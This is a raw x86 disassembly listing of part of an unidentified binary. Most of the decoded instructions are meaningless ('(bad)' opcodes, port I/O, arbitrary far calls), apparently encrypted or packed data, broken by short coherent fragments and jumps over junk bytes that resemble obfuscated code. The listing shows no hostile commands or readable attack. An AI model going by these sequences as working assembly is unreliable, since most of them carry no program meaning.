  408caf:	mov    gs,WORD PTR [edi-0x3b]
  408cb2:	sar    bh,cl
  408cb4:	fucom  st(3)
  408cb6:	rol    BYTE PTR [ebp+0x57],0x36
  408cba:	(bad)  
  408cbb:	call   0x9f66e852
  408cc0:	out    0x1b,eax
  408cc2:	push   ecx
  408cc3:	sbb    ebp,DWORD PTR [eax+0x56a161ba]
  408cc9:	les    ecx,FWORD PTR [ecx+0x4e]
  408ccc:	cmp    al,dh
  408cce:	adc    eax,0x409bf857
  408cd3:	mov    ah,0xcf
  408cd5:	fimul  DWORD PTR [esi-0x77]
  408cd8:	push   eax
  408cd9:	out    0x18,eax
  408cdb:	stos   BYTE PTR es:[edi],al
  408cdc:	and    al,0x4e
  408cde:	(bad)  [edx-0x29d93bba]
  408ce4:	xchg   ebp,eax
  408ce5:	push   edx
  408ce6:	loope  0x408c97
  408ce8:	mov    edx,0xb199ca74
  408ced:	mov    ebx,DWORD PTR [edi+0x2a]
  408cf0:	clc    
  408cf1:	inc    ebx
  408cf2:	(bad)  
  408cf4:	mov    es,esp
  408cf6:	cmp    esi,ecx
  408cf8:	(bad)  
  408cf9:	cmp    esi,DWORD PTR [ecx+0x5c]
  408cfc:	mov    BYTE PTR cs:[ebp*2-0x9a7f22c],0x79
  408d05:	push   ebp
  408d06:	(bad)  
  408d07:	test   al,0xe6
  408d09:	push   esp
  408d0a:	inc    eax
  408d0b:	inc    esp
  408d0c:	push   0x60a6e93b
  408d11:	mov    bl,0xa2
  408d14:	dec    ebx
  408d15:	mov    ebp,0xfb657f75
  408d1a:	daa    
  408d1b:	pushf  
  408d1c:	jo     0x408d54
  408d1e:	mov    cl,0x3b
  408d20:	rcl    DWORD PTR [ebp+0x28],0xa7
  408d24:	punpckhdq mm1,mm2
  408d27:	shl    DWORD PTR [edi-0x498bc145],cl
  408d2d:	cmp    bh,BYTE PTR ds:0xde151faa
  408d33:	rcr    dh,cl
  408d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d36:	inc    edx
  408d37:	mov    bl,0xe1
  408d39:	sbb    DWORD PTR [eax],edi
  408d3b:	test   eax,0xff8cd8a4
  408d40:	aaa    
  408d41:	pop    DWORD PTR [esp+ebx*4]
  408d44:	xchg   ch,dh
  408d46:	push   eax
  408d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d48:	out    0x89,eax
  408d4a:	sti    
  408d4b:	cmp    eax,0x1ee9fd2c
  408d50:	ret    0x892a
  408d53:	in     eax,dx
  408d54:	fldenv ds:0x2ce8cf29
  408d5a:	xchg   edx,eax
  408d5b:	jle    0x408dc6
  408d5d:	xlat   BYTE PTR ds:[ebx]
  408d5e:	test   al,0x36
  408d60:	lahf   
  408d61:	adc    ebp,ecx
  408d63:	stc    
  408d64:	and    al,0x3b
  408d66:	popa   
  408d67:	push   esp
  408d68:	js     0x408cf0
  408d6a:	mov    esp,0x1995f808
  408d6f:	jo     0x408dc3
  408d71:	jae    0x408d33
  408d73:	lods   al,BYTE PTR ds:[esi]
  408d74:	dec    ecx
  408d75:	cmp    DWORD PTR [ebx-0x3becef8],eax
  408d7b:	pop    eax
  408d7c:	fs dec ecx
  408d7e:	xor    cl,BYTE PTR [edi]
  408d80:	mov    esp,DWORD PTR [eax-0x50]
  408d83:	fwait
  408d84:	dec    ebx
  408d85:	vmovss DWORD PTR [ebx],xmm5
  408d89:	fidiv  WORD PTR [esi-0x55]
  408d8c:	mov    ah,0x39
  408d8e:	ret    0x259f
  408d91:	outs   dx,DWORD PTR ds:[esi]
  408d92:	fs xchg edx,eax
  408d94:	mov    edx,DWORD PTR [ebp-0xc]
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	sbb    BYTE PTR [ecx],bl
  408dbc:	arpl   WORD PTR [edx],dx
  408dbe:	xchg   ebx,eax
  408dbf:	fidiv  WORD PTR [eax+0x70]
  408dc2:	imul   edi,DWORD PTR [edi+0x70],0x2f9a6b70
  408dc9:	in     al,dx
  408dca:	mov    edx,0xbd084d07
  408dcf:	test   eax,0x95392c57
  408dd4:	or     al,0xf7
  408dd6:	mov    edx,0x73cc5dbf
  408ddb:	nop
  408ddc:	les    esp,FWORD PTR [esi-0x5bb7f5e]
  408de2:	fnstcw WORD PTR [edi]
  408de4:	pop    ecx
  408de5:	loop   0x408daa
  408de7:	(bad)  
  408de8:	scas   al,BYTE PTR es:[edi]
  408de9:	xchg   ecx,eax
  408dea:	popf   
  408deb:	js     0x408e4d
  408ded:	jno    0x408e59
  408def:	scas   al,BYTE PTR es:[edi]
  408df0:	jmp    0x408e30
  408df2:	inc    eax
  408df3:	cmp    eax,DWORD PTR [ebx]
  408df5:	scas   eax,DWORD PTR es:[edi]
  408df6:	daa    
  408df7:	pushf  
  408df8:	(bad)  
  408df9:	mov    ch,0x69
  408dfb:	sbb    eax,0xf2617537
  408e00:	mov    ebp,0xfe090b41
  408e05:	(bad)  
  408e06:	rcr    DWORD PTR [edx],0xf
  408e09:	pop    es
  408e0a:	xor    DWORD PTR [edx-0x37a47e31],0xffffffed
  408e11:	out    0x3d,eax
  408e13:	test   dh,0x80
  408e16:	lock mov cl,0xcb
  408e19:	retf   0x2dd6
  408e1c:	(bad)  
  408e1d:	mov    ah,0x39
  408e1f:	rol    DWORD PTR [esi+0x316fb0a2],0xd6
  408e26:	jae    0x408dd6
  408e28:	aam    0xe4
  408e2a:	dec    ebp
  408e2b:	call   0x1b7a5739
  408e30:	mov    eax,0x1ac15f99
  408e35:	popf   
  408e36:	test   DWORD PTR [edx+0x9f2f414],edx
  408e3c:	mov    esi,0xa6e9265d
  408e41:	gs xchg ecx,eax
  408e43:	jg     0x408eb5
  408e45:	and    bl,ch
  408e47:	mov    bh,0x2c
  408e49:	lea    esp,[eax]
  408e4b:	jecxz  0x408dd1
  408e4d:	jno    0x408df0
  408e4f:	sub    DWORD PTR [ebx+0x67a1e8db],esp
  408e55:	pop    ecx
  408e56:	fstp   st(2)
  408e58:	ret    
  408e59:	out    0xa9,eax
  408e5b:	pop    ecx
  408e5c:	mov    ch,0xa
  408e5e:	inc    edi
  408e5f:	retf   0x9502
  408e62:	retf   
  408e63:	jp     0x408ec8
  408e65:	outs   dx,DWORD PTR ss:[esi]
  408e67:	add    al,0x7d
  408e69:	sub    eax,0xea243646
  408e6e:	outs   dx,BYTE PTR ds:[esi]
  408e6f:	fidivr DWORD PTR [edi]
  408e71:	int3   
  408e72:	int    0xa2
  408e74:	je     0x408e5f
  408e76:	dec    edx
  408e78:	(bad)  
  408e79:	xlat   BYTE PTR ds:[ebx]
  408e7a:	dec    esi
  408e7b:	xchg   edx,eax
  408e7c:	fdiv   QWORD PTR [edx]
  408e7e:	pop    edx
  408e7f:	xlat   BYTE PTR ds:[ebx]
  408e80:	repz (bad) 
  408e84:	adc    DWORD PTR [ecx+ecx*8+0x34],ebx
  408e88:	ds inc esp
  408e8a:	mov    edx,DWORD PTR ds:0xba744aa9
  408e90:	push   ss
  408e91:	xchg   esp,eax
  408e92:	test   bh,cl
  408e94:	mov    WORD PTR [eax],?
  408e96:	retf   
  408e97:	cmc    
  408e98:	mov    ecx,DWORD PTR [edi]
  408e9a:	mov    ah,0xbb
  408e9c:	sahf   
  408e9d:	inc    ebx
  408e9e:	sbb    DWORD PTR [ecx+0x1cf4f591],ebx
  408ea4:	(bad)  [ebp-0x5a383e2e]
  408eaa:	mov    ss,WORD PTR [eax+eax*4]
  408ead:	lds    eax,FWORD PTR [ebp+0x33637e69]
  408eb3:	mov    bh,BYTE PTR [bx+0x77ab]
  408eb8:	dec    esp
  408eb9:	jbe    0x408e3e
  408ebb:	test   DWORD PTR [ebp-0x5709da31],esi
  408ec1:	xor    ah,BYTE PTR gs:[esi-0x4c]
  408ec5:	fld    TBYTE PTR [ecx-0x594996a2]
  408ecb:	add    eax,0x65ba3e1d
  408ed0:	in     al,dx
  408ed1:	mov    esi,0x10e3f273
  408ed6:	(bad)  
  408ed7:	idiv   BYTE PTR [ecx+ebx*8-0x73453626]
  408ede:	and    ch,BYTE PTR [ebx]
  408ee0:	dec    esi
  408ee1:	bound  esi,QWORD PTR [ecx+ecx*8-0x1cb183fc]
  408ee8:	or     eax,0xb7b0d908
  408eed:	in     al,dx
  408eee:	dec    edx
  408eef:	icebp  
  408ef0:	inc    edx
  408ef1:	xor    bl,BYTE PTR [edx]
  408ef3:	mov    DWORD PTR [ebx-0xf],ecx
  408ef6:	shl    BYTE PTR [edx+0x3a],1
  408ef9:	push   ebp
  408efa:	stc    
  408efb:	call   0x52f9:0xee3ec327
  408f02:	or     BYTE PTR [esp+edx*2+0x1ffe1b6b],bl
  408f09:	or     DWORD PTR [esi+0x3],0x37
  408f0d:	mov    ebx,0xc3aac61e
  408f12:	push   esi
  408f13:	jg     0x408ef5
  408f15:	repnz or edx,DWORD PTR [edx-0x4]
  408f19:	dec    eax
  408f1a:	mov    edx,0x32512b5d
  408f1f:	pusha  
  408f20:	xor    ch,BYTE PTR ds:0xce8a8e51
  408f26:	(bad)  
  408f27:	mov    ch,al
  408f29:	and    cl,BYTE PTR [edx-0x68a30c37]
  408f2f:	(bad)  
  408f30:	jmp    0x408eb9
  408f32:	push   esi
  408f33:	nop
  408f34:	dec    esp
  408f35:	(bad)  
  408f36:	push   eax
  408f37:	aad    0x58
  408f39:	push   esi
  408f3a:	dec    edx
  408f3b:	mov    eax,ds:0xfe1843cd
  408f40:	(bad)  
  408f41:	out    dx,eax
  408f42:	out    0x3,eax
  408f44:	fld    DWORD PTR [edx+0xf]
  408f47:	or     eax,0x7abe22f4
  408f4c:	push   ebp
  408f4d:	sub    cl,BYTE PTR [edi+0x61e1b644]
  408f53:	out    dx,al
  408f54:	push   esp
  408f55:	inc    eax
  408f56:	mov    ch,0x6e
  408f58:	xchg   ebx,eax
  408f59:	mov    esp,0x10ac6853
  408f5e:	inc    edi
  408f5f:	or     dh,BYTE PTR [esi]
  408f61:	dec    edi
  408f62:	(bad)  
  408f63:	dec    eax
  408f64:	fdivr  QWORD PTR [ecx]
  408f66:	push   es
  408f67:	sub    ch,cl
  408f69:	cli    
  408f6a:	out    0x54,eax
  408f6c:	out    0xeb,eax
  408f6e:	loope  0x408fbb
  408f70:	sbb    al,BYTE PTR [ebx-0x36]
  408f73:	mov    esp,ebx
  408f75:	loopne 0x408f22
  408f77:	mov    ?,ebp
  408f79:	sbb    al,0xef
  408f7b:	mul    DWORD PTR [ebp-0x14]
  408f7e:	inc    ecx
  408f7f:	push   ds
  408f80:	pop    edx
  408f81:	pushf  
  408f82:	or     eax,0x612b12e3
  408f87:	jae    0x408f15
  408f89:	sbb    ch,ch
  408f8b:	outs   dx,DWORD PTR ds:[esi]
  408f8c:	inc    cx
  408f8e:	adc    ebx,DWORD PTR [ebp+esi*4-0x4a900e6a]
  408f95:	cmc    
  408f96:	out    0x8a,eax
  408f98:	addr16 and eax,0xb04f2528
  408f9e:	cmp    al,0x8a
  408fa0:	shl    DWORD PTR [eax+esi*2],cl
  408fa3:	and    cl,bl
  408fa5:	mov    dh,0xc4
  408fa7:	psubq  mm2,mm4
  408faa:	mov    ebp,0x2f5e32df
  408faf:	test   DWORD PTR [edi+0x4e94a8da],esi
  408fb5:	sbb    BYTE PTR [edi+0x23],bl
  408fb8:	mov    bh,0x2a
  408fba:	iret   
  408fbb:	in     al,dx
  408fbc:	je     0x408f48
  408fbe:	push   ebp
  408fbf:	jnp    0xf8748442
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	test   eax,0x8c2cb0f1
  409009:	fdiv   QWORD PTR [eax+0x70]
  40900c:	imul   edi,DWORD PTR [edi+0x70],0x5a2d7c70
  409013:	pop    ecx
  409014:	aaa    
  409015:	push   edi
  409016:	in     al,dx
  409017:	pop    es
  409018:	cmc    
  409019:	lahf   
  40901a:	ins    DWORD PTR es:[edi],dx
  40901b:	sbb    bl,ah
  40901d:	inc    ecx
  40901e:	loopne 0x409026
  409020:	or     ebp,esi
  409022:	push   ds
  409023:	shr    ebx,cl
  409025:	(bad)  
  409026:	out    dx,eax
  409027:	mov    esp,0xc74a0182
  40902c:	imul   ebx,ebx,0x7e382c74
  409032:	mov    esi,0xaf07bc91
  409037:	out    0x8f,al
  409039:	pusha  
  40903a:	gs sub ebp,edx
  40903d:	sbb    al,0x9d
  40903f:	outs   dx,DWORD PTR ds:[esi]
  409040:	ds mov edx,0xfcd67171
  409046:	mov    cl,0xb9
  409048:	jo     0x408fcb
  40904a:	mov    WORD PTR [esp+ecx*1-0x57],ds
  40904e:	dec    edi
  40904f:	sub    dh,BYTE PTR [edi]
  409051:	xchg   ecx,eax
  409052:	scas   eax,DWORD PTR es:[edi]
  409053:	pop    es
  409054:	adc    esp,edi
  409056:	in     al,dx
  409057:	jl     0x4090aa
  409059:	loopne 0x40900e
  40905b:	enter  0xef84,0x78
  40905f:	arpl   WORD PTR [eax],si
  409061:	test   eax,0x2af18555
  409066:	xchg   BYTE PTR [ecx+0x5f],cl
  409069:	mov    ch,0x42
  40906b:	arpl   WORD PTR [eax+0xd],dx
  40906e:	and    dl,bh
  409070:	sti    
  409071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409072:	out    0x2,eax
  409074:	or     bl,dh
  409076:	lock push 0x5a
  409079:	pop    ecx
  40907a:	lahf   
  40907b:	mov    edi,DWORD PTR [esi-0x4bcbaf]
  409081:	aaa    
  409082:	int3   
  409083:	gs add eax,0x7a016e5f
  409089:	ja     0x409100
  40908b:	popa   
  40908c:	or     eax,0xb7f5fca3
  409091:	sub    DWORD PTR [ebp+0x18ea75ed],ebp
  409097:	pop    ds
  409098:	bound  eax,QWORD PTR [eax+edi*4+0x39e20d2d]
  40909f:	mov    eax,0x240b7bc
  4090a4:	push   0xb8231908
  4090a9:	inc    BYTE PTR [esi]
  4090ab:	mov    dl,0x46
  4090ad:	sbb    al,0xcb
  4090af:	ins    DWORD PTR es:[edi],dx
  4090b0:	mov    WORD PTR [ecx+0x4d6bce],es
  4090b6:	pop    ebx
  4090b7:	cli    
  4090b8:	loope  0x4090bc
  4090ba:	iret   
  4090bb:	call   0xdc3e:0xba49c87a
  4090c2:	(bad)  
  4090c3:	mov    esp,0x5343b6b1
  4090c8:	jp     0x409082
  4090ca:	aaa    
  4090cb:	mov    ah,0xe8
  4090cd:	shr    cl,1
  4090cf:	test   dh,0xd9
  4090d2:	inc    eax
  4090d3:	push   es
  4090d4:	sbb    esp,DWORD PTR [ecx+0x3d1fad54]
  4090da:	sbb    al,0xfb
  4090dc:	pushf  
  4090dd:	jns    0x40912c
  4090df:	pop    esi
  4090e0:	adc    DWORD PTR [eax],0xffffff9b
  4090e3:	scas   eax,DWORD PTR es:[edi]
  4090e4:	repnz xchg esp,eax
  4090e6:	adc    BYTE PTR [ecx],ch
  4090e8:	xor    al,BYTE PTR [ecx+ebx*8]
  4090eb:	add    BYTE PTR [esi],ch
  4090ed:	out    0x31,eax
  4090ef:	dec    ecx
  4090f0:	push   es
  4090f1:	loopne 0x40907e
  4090f3:	leave  
  4090f4:	xchg   DWORD PTR [edx],esp
  4090f6:	std    
  4090f7:	fcom   DWORD PTR [esi-0x71]
  4090fa:	jmp    0x40911b
  4090fc:	leave  
  4090fd:	out    0x58,eax
  4090ff:	add    al,0x9c
  409101:	mov    dh,0xcf
  409103:	jmp    0x409183
  409105:	lds    eax,FWORD PTR [esi-0xa]
  409108:	pop    eax
  409109:	(bad)  
  40910a:	xchg   ecx,eax
  40910b:	mov    BYTE PTR [ecx],dl
  40910d:	dec    eax
  40910e:	xlat   BYTE PTR ds:[ebx]
  40910f:	popf   
  409110:	hlt    
  409111:	sahf   
  409112:	repnz xchg esi,eax
  409114:	aad    0xff
  409116:	fstp   DWORD PTR [edx+0x70b99c6d]
  40911c:	jp     0x40916f
  40911e:	cmp    eax,0xf12fa2fb
  409123:	stc    
  409124:	in     eax,0x8
  409126:	dec    ebp
  409127:	push   0xffffffba
  409129:	mov    ebp,0xaec6c2ca
  40912e:	rcl    BYTE PTR ds:0xdc15b417,0x7d
  409135:	stos   DWORD PTR es:[edi],eax
  409136:	movups XMMWORD PTR [eax+0x73],xmm1
  40913a:	inc    ebx
  40913b:	aad    0x84
  40913d:	pushf  
  40913e:	push   edx
  40913f:	js     0x409151
  409141:	mov    ah,cl
  409143:	or     BYTE PTR [ebp-0x61],ch
  409146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409147:	lds    ebp,FWORD PTR [eax]
  409149:	add    BYTE PTR [esi+0x75],dl
  40914c:	dec    eax
  40914d:	adc    al,0x3e
  40914f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409150:	mov    al,0x43
  409152:	stos   BYTE PTR es:[edi],al
  409153:	xor    bl,BYTE PTR [edi-0x64188403]
  409159:	in     eax,dx
  40915a:	popa   
  40915b:	(bad)
  40915f:	xor    edi,ebx
  409161:	cmp    BYTE PTR [edi+ebx*8-0x60],cl
  409165:	leave  
  409166:	xchg   ebp,eax
  409167:	arpl   WORD PTR [ebp+0x2a],dx
  40916a:	retf   0xf621
  40916d:	gs or  edi,eax
  409170:	retf   0x9fb6
  409173:	cmc    
  409174:	jne    0x409189
  409176:	cmc    
  409177:	ins    BYTE PTR es:[edi],dx
  409178:	retf   
  409179:	add    eax,0x87b19120
  40917e:	fild   DWORD PTR [edx]
  409180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409181:	xchg   ebx,eax
  409182:	repz mov ecx,0xc6da8d52
  409188:	mov    eax,ds:0x2e197c91
  40918d:	in     eax,dx
  40918e:	pushf  
  40918f:	xlat   BYTE PTR ds:[ebx]
  409190:	xor    esi,DWORD PTR [ebx+0x31617d6a]
  409196:	cs gs dec edx
  409199:	jae    0x4091b5
  40919b:	pusha  
  40919c:	or     BYTE PTR [edx+eiz*4+0x33268db0],bh
  4091a3:	(bad)  
  4091a4:	call   0xc043:0xbc475614
  4091ab:	lods   eax,DWORD PTR ds:[esi]
  4091ac:	test   bh,cl
  4091ae:	jmp    0x4091f1
  4091b0:	push   ss
  4091b1:	jne    0x4091e1
  4091b3:	xchg   BYTE PTR [esi+0x6f],bl
  4091b6:	loopne 0x409164
  4091b8:	aaa    
  4091b9:	lea    ebx,ds:0x7a4e9141
  4091bf:	xor    DWORD PTR [ebx+0x1c],edi
  4091c2:	add    eax,0xa3a0c2e2
  4091c7:	lahf   
  4091c8:	call   0xe703:0x4906616b
  4091cf:	or     BYTE PTR [esp+esi*2-0x3e8fe503],dl
  4091d6:	cld    
  4091d7:	test   bl,al
  4091d9:	xchg   edi,eax
  4091da:	cmp    dh,BYTE PTR [eax+0x39]
  4091dd:	mov    al,0x49
  4091df:	dec    ecx
  4091e0:	(bad)  
  4091e1:	push   ebx
  4091e2:	inc    ebp
  4091e3:	popa   
  4091e4:	jmp    0x40920d
  4091e6:	mov    ebx,0xcaccf474
  4091eb:	cmp    DWORD PTR [esi+ebp*1+0x5a],ebx
  4091ef:	(bad)  
  4091f0:	jmp    0x71ff520a
  4091f5:	push   esi
  4091f6:	dec    ebp
  4091f7:	sbb    DWORD PTR [edx],ecx
  4091f9:	in     al,dx
  4091fa:	mov    al,0x15
  4091fc:	retf   
  4091fd:	push   esi
  4091fe:	stos   DWORD PTR es:[edi],eax
  4091ff:	sbb    bh,ah
  409201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409202:	sbb    edx,ebx
  409204:	test   eax,0xf903e392
  409209:	jmp    0x40941d
  40920e:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  409215:	cdq    
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	fsubr  DWORD PTR [esi-0x257a8702]
  409220:	jo     0x409292
  409222:	imul   edi,DWORD PTR [edi+0x70],0xb4093e70
  409229:	ds sbb al,0xe8
  40922c:	push   DWORD PTR [esi]
  40922e:	test   BYTE PTR [ebp+0xc458240],bl
  409234:	sbb    al,0x49
  409236:	jnp    0x409295
  409238:	imul   ebp,DWORD PTR [edx+0x5f284f6e],0x26
  40923f:	imul   edi,DWORD PTR [ebx+0x49ae14f9],0xa9887f44
  409249:	les    ecx,FWORD PTR [ecx+0x2d]
  40924c:	sar    DWORD PTR [eax-0x55eb7290],0x60
  409253:	push   eax
  409254:	into   
  409255:	retf   
  409256:	mov    dh,0x5e
  409258:	sub    BYTE PTR [ebx],cl
  40925a:	es jae 0x4092b5
  40925d:	loop   0x4091f6
  40925f:	jmp    0xd52a:0x43475ef2
  409266:	or     dh,BYTE PTR [edx]
  409268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409269:	xchg   edx,eax
  40926a:	dec    ecx
  40926b:	int    0x25
  40926d:	sub    eax,0x50454d68
  409272:	out    dx,al
  409273:	clc    
  409274:	push   eax
  409275:	sti    
  409276:	dec    edx
  409277:	retf   
  409278:	(bad)  
  409279:	jmp    0x3a7abe04
  40927e:	daa    
  40927f:	in     eax,0xe0
  409281:	fld    QWORD PTR [edi]
  409283:	stc    
  409284:	push   es
  409285:	lahf   
  409286:	pop    eax
  409287:	push   ebp
  409288:	mov    DWORD PTR [esi-0x2c0da1f1],edi
  40928e:	ins    DWORD PTR es:[edi],dx
  40928f:	push   eax
  409290:	add    cl,ah
  409292:	je     0x40924e
  409294:	fnsave [edi]
  409296:	xchg   esi,eax
  409297:	jecxz  0x409288
  409299:	push   esi
  40929a:	les    ebp,FWORD PTR [ebx]
  40929c:	mov    bl,0xab
  40929e:	pop    ecx
  40929f:	xchg   esp,eax
  4092a0:	cmc    
  4092a1:	dec    eax
  4092a2:	(bad)
  4092a5:	addr16 push ebx
  4092a7:	push   0x22
  4092a9:	sub    BYTE PTR [edx+0x6b],0x9b
  4092ad:	sbb    al,0xe4
  4092af:	push   ecx
  4092b0:	out    0x79,eax
  4092b2:	sbb    eax,0x8ba7bf7d
  4092b7:	out    dx,al
  4092b8:	dec    esi
  4092b9:	fcmovnu st,st(2)
  4092bb:	jg     0x40932c
  4092bd:	ss push esp
  4092bf:	fbld   TBYTE PTR [esi-0x40]
  4092c2:	mov    eax,0xa75b0509
  4092c7:	rcr    DWORD PTR [ebp+0x4a41c22d],0x6e
  4092ce:	je     0x409300
  4092d0:	or     DWORD PTR [ecx+eax*1-0x5dbd74c4],ebx
  4092d7:	xchg   BYTE PTR [edi-0x5899bf21],ah
  4092dd:	arpl   WORD PTR fs:[esi-0x31],ax
  4092e1:	fstp   DWORD PTR [edi-0x13bf3520]
  4092e7:	stos   BYTE PTR es:[edi],al
  4092e8:	(bad)  
  4092e9:	xchg   ebp,eax
  4092ea:	adc    eax,0xe1aec4c0
  4092ef:	or     dl,ch
  4092f1:	fst    DWORD PTR [edi+ecx*8]
  4092f4:	mov    edx,0xab76fd6c
  4092f9:	ins    BYTE PTR es:[edi],dx
  4092fa:	push   ss
  4092fb:	test   al,0xa9
  4092fe:	test   bh,cl
  409300:	das    
  409301:	dec    ecx
  409302:	inc    eax
  409303:	sub    DWORD PTR [edi-0x7f317483],esp
  409309:	scas   eax,DWORD PTR es:[edi]
  40930a:	and    ebx,esi
  40930c:	mov    edi,0x919e64eb
  409311:	adc    ebx,DWORD PTR [ebx]
  409313:	iret   
  409314:	xor    edx,edx
  409316:	mov    esi,0xc0f6ca8d
  40931b:	fistp  WORD PTR [esi]
  40931d:	out    dx,al
  40931e:	mov    dl,0xaa
  409320:	push   cs
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	adc    ebx,DWORD PTR [esi+0x6441e4f3]
  409328:	xor    BYTE PTR ds:0x274b1076,0x9f
  40932f:	xchg   ebp,eax
  409330:	call   0x49e8:0xa6c66f6
  409337:	dec    ebx
  409338:	inc    ebx
  409339:	pop    eax
  40933a:	and    al,0x2f
  40933c:	pop    ecx
  40933d:	icebp  
  40933e:	loope  0x4092f6
  409340:	mov    dl,0x5a
  409342:	mov    al,ds:0xf6bc8a1d
  409347:	clc    
  409348:	or     ch,BYTE PTR fs:[edi-0x4d]
  40934c:	into   
  40934d:	mov    bl,0xbd
  40934f:	(bad)
  409353:	sti    
  409354:	imul   edi,DWORD PTR ds:0xeb49eb5d,0x4bad132a
  40935e:	or     al,0x83
  409360:	push   esi
  409361:	mov    BYTE PTR [ebp+0x1],ch
  409364:	or     al,BYTE PTR [edx+0x48]
  409367:	or     al,0x48
  409369:	sub    edx,DWORD PTR [ebx+eiz*2-0xc]
  40936d:	xor    esp,DWORD PTR gs:[edi+0x3d049cf3]
  409374:	xchg   esp,eax
  409375:	xor    ebp,DWORD PTR [ecx-0x2dd322de]
  40937b:	(bad)  
  40937d:	cmp    dh,BYTE PTR [edx]
  40937f:	mov    esi,0x9765ae54
  409384:	rcl    ebx,cl
  409386:	mov    esp,0x9a58ecfc
  40938b:	loopne 0x409323
  40938d:	aaa    
  40938e:	les    ecx,FWORD PTR [eax-0x77]
  409391:	gs (bad) fs:[edx]
  409395:	inc    ebx
  409396:	ja     0x409403
  409398:	int3   
  409399:	sub    ecx,DWORD PTR [esi]
  40939b:	cmp    BYTE PTR [ecx+edi*2],bl
  40939e:	jmp    0x4093c8
  4093a0:	jne    0x4093ac
  4093a2:	mov    edi,0xac59a2d6
  4093a7:	push   edx
  4093a8:	loop   0x4093a9
  4093aa:	je     0x409423
  4093ac:	or     dh,BYTE PTR [ebp-0x251ece3b]
  4093b2:	popa   
  4093b3:	sbb    al,0x3f
  4093b5:	popf   
  4093b6:	fstp   st(4)
  4093b8:	clc    
  4093b9:	cli    
  4093ba:	lea    ebp,[edi]
  4093bc:	sub    eax,0x8fabf425
  4093c1:	mov    gs,WORD PTR [ebx+0x77d3ce83]
  4093c7:	sub    ecx,DWORD PTR [ebp+0x7b081698]
  4093cd:	xchg   edx,eax
  4093ce:	sub    DWORD PTR [edx-0x75fc00ee],0xffffffd9
  4093d5:	(bad)  
  4093d6:	cmp    bl,BYTE PTR [ebx+0x4ee00db9]
  4093dc:	arpl   WORD PTR [eax+eax*4-0x6d],di
  4093e0:	in     eax,dx
  4093e1:	or     BYTE PTR [ebx-0x24],ah
  4093e4:	jae    0x409447
  4093e6:	add    BYTE PTR [eax-0x4ba7fa2b],cl
  4093ec:	je     0x4093f0
  4093ee:	push   ecx
  4093ef:	cmp    ch,BYTE PTR ds:0xb4b9deac
  4093f5:	push   cs
  4093f6:	fisubr WORD PTR [ebx]
  4093f8:	retf   
  4093f9:	mov    edi,0xc27f2e7c
  4093fe:	sbb    BYTE PTR [eax+0x441b1cad],al
  409404:	leave  
  409405:	int3   
  409406:	mov    edx,0x43fe5ca4
  40940b:	cmp    ecx,ebx
  40940d:	loope  0x4093bc
  40940f:	daa    
  409410:	retf   0x4962
  409413:	or     al,0x9f
  409415:	pop    ebp
  409416:	outs   dx,DWORD PTR ds:[esi]
  409417:	out    dx,eax
  409418:	test   al,0xb0
  40941b:	loopne 0x409449
  40941d:	imul   edx,edi
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx-0x1fa9e013]
  409433:	into   
  409434:	add    edi,esi
  409436:	fdiv   DWORD PTR [eax+0x70]
  409439:	imul   edi,DWORD PTR [edi+0x70],0xae689d70
  409440:	xlat   BYTE PTR ds:[ebx]
  409441:	in     eax,0xd8
  409443:	dec    ebp
  409444:	dec    ecx
  409445:	jg     0x4093f1
  409447:	mov    esp,0xb10d308f
  40944c:	pushf  
  40944d:	aaa    
  40944e:	mov    al,0x27
  409450:	inc    ebp
  409451:	jae    0x40941f
  409453:	gs jnp 0x409431
  409456:	mov    ch,0xa0
  409458:	popa   
  409459:	xchg   BYTE PTR [edx-0x30ad4fc2],ch
  40945f:	fsubr  st,st(5)
  409461:	mov    al,ds:0x5fac09d6
  409466:	and    bh,BYTE PTR [edx]
  409468:	popf   
  409469:	inc    esi
  40946a:	addr16 inc ebp
  40946c:	mov    ch,0x79
  40946e:	cmc    
  40946f:	cmp    eax,DWORD PTR [edi+0x4c7e9608]
  409475:	inc    esp
  409477:	into   
  409478:	mov    eax,0x821b99e6
  40947d:	(bad)  
  40947e:	scas   eax,DWORD PTR es:[edi]
  40947f:	push   esp
  409480:	hlt    
  409481:	pop    es
  409482:	inc    ebp
  409483:	das    
  409484:	shl    BYTE PTR [bx+si-0x38],1
  409488:	clc    
